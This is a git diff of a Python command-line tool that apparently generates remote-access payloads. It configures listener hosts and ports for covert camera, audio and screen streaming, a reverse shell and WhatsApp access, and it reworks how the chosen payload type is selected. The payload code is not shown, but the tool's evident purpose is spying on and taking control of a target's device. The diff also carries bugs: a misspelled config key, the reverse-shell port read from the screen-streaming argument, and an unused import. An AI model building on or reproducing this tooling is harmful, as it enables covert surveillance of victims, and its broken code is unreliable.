@@ -9,10 +9,12 @@ P_LPORT_CameraStreaming = ""
 P_LPORT_ScreenSharing = ""
 P_LPORT_ReverseShell = ""
 P_LPORT_Whatsapp = ""
+#defin the __SET__value to run the right payload maker
+SET_VALUE = ""
 
 import argparse
 import time, os, sys
-from typing import Text
+from typing import ParamSpec, Text
 from server.name import SERVER_TYPES
 from payloads.name import PAYLOADS_TYPES
 from assets.colors import colors
@@ -43,12 +45,14 @@ __USE__ = ARGS.use
 __SET__ = ARGS.set
 __TARGET__ = ARGS.target
 __NAME__ = ARGS.name
+#preforming a definition for __SET__
+SET_VALUE = __SET__
 #settings args for "set" and "use" argument
 __SocketLhost__ = ARGS.SocketLhost
 __SocketLport__ = ARGS.SocketLport
 __CameraStreamingPort__ = ARGS.CameraStreamingPort
 __ScreenStreamingPort__ = ARGS.ScreenStreamingPort 
-__ReverseShell__ = ARGS.ScreenStreamingPort
+__ReverseShellPort__ = ARGS.ScreenStreamingPort
 __AudioStreamingPort__ = ARGS.AudioStreamingPort
 if __SHOW__:
     if __SHOW__ == "servers":
@@ -69,20 +73,26 @@ if __SET__:
     checking for what __SET__ [payload]
     type have being chosing by the user
     """
-    if __SET__ == PAYLOADS_TYPES[0]:
-        with open("config.json", "r") as JSON_CONF:
-            CONFIG_LOAD = json.load(JSON_CONF)
-            if CONFIG_LOAD["PayloadConfig"]["lhost"]:
-                LHOST = socket.gethostbyname(socket.gethostname()) if CONFIG_LOAD["PayloadConfig"]["lhost"] == "auto" else CONFIG_LOAD["PayloadConfig"]["lhost"]
-            else:
-                pass
-            if __SocketLhost__:
-                LHOST = __SocketLhost__
-            else:
-                pass
-            if LHOST:
-                pass
-            else:
-                NoLhostSpec()
-            P_LPORT_SOCKET = CONFIG_LOAD["PayloadConfig"]["lport"]["SocketPort"] if CONFIG_LOAD["PayloadConfig"]["lport"]["SocketPort"] else __SocketLport__ if __SocketLport__ else NoLportSpec()
+    with open("config.json", "r") as JSON_CONF:
+        CONFIG_LOAD = json.load(JSON_CONF)
+        if CONFIG_LOAD["PayloadConfig"]["lhost"]:
+            LHOST = socket.gethostbyname(socket.gethostname()) if CONFIG_LOAD["PayloadConfig"]["lhost"] == "auto" else CONFIG_LOAD["PayloadConfig"]["lhost"]
+        else:
+            pass
+        if __SocketLhost__:
+            LHOST = __SocketLhost__
+        else:
+            pass
+        if LHOST:
+            pass
+        else:
+            NoLhostSpec()
+        P_LPORT_SOCKET = CONFIG_LOAD["PayloadConfig"]["lport"]["SocketPort"] if CONFIG_LOAD["PayloadConfig"]["lport"]["SocketPort"] else __SocketLport__ if __SocketLport__ else NoLportSpec()
+        if __SET__ == PAYLOADS_TYPES[0]: #CameraStreaming
             __CameraStreamingPort__ = CONFIG_LOAD["PayloadConfig"]["lport"]["CameraStreamingPort"] if CONFIG_LOAD["PayloadConfig"]["lport"]["CameraStreamingPort"] else __CameraStreamingPort__ if __CameraStreamingPort__ else NoCameraStreamingPortSpec()
+        elif __SET__ == PAYLOADS_TYPES[1]:  #AudioStreaming
+            __AudioStreamingPort__ = CONFIG_LOAD["PayloadConfig"]["lport"]["AudioStreamingPort"] if CONFIG_LOAD["PayloadConfig"]["lport"]["AudioStreamingPort"] else __AudioStreamingPort__ if __AudioStreamingPort__ else NoAudioStreamingPortSpec()
+        elif __SET__ == PAYLOADS_TYPES[2]: #ScreenStreaming
+            __ScreenStreamingPort__ = CONFIG_LOAD["PayloadCondig"]["lport"]["ScreenStreamingPort"] if CONFIG_LOAD["PayloadCondig"]["lport"]["ScreenStreamingPort"] else __ScreenStreamingPort__ if __ScreenStreamingPort__ else NoScreenStreamingPortSpec()
+        elif __SET__ == PAYLOADS_TYPES[3]: #ReverseShell
+            __ReverseShellPort__ = CONFIG_LOAD["PayloadConfig"]["lport"]["ReverseShellPort"] if CONFIG_LOAD["PayloadConfig"]["lport"]["ReverseShellPort"] else __ReverseShellPort__ if __ReverseShellPort__ else NoReverShellPort()
